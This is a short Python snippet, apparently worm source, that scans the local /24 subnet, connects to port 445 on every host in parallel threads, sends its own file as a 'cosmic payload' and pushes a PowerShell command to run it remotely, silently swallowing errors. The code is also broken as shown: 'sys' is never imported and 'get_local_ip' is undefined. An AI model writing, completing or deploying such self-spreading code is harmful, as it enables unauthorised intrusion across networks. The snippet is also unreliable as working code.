import socket
import threading
import subprocess

def cosmic_spread(ip):
    try:
        # Worm-like propagation
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, 445))
        
        # Send cosmic payload
        payload = b"cosmic" + open(sys.argv[0], 'rb').read()
        s.send(payload)
        
        # Execute remote command
        s.send(b"powershell -c \"" + payload + b"\"")
    except Exception:
        pass

# Scan and propagate through network
def scan_network():
    base_ip = '.'.join(get_local_ip().split('.')[:-1]) + '.'
    for i in range(1, 255):
        ip = base_ip + str(i)
        threading.Thread(target=cosmic_spread, args=(ip,)).start()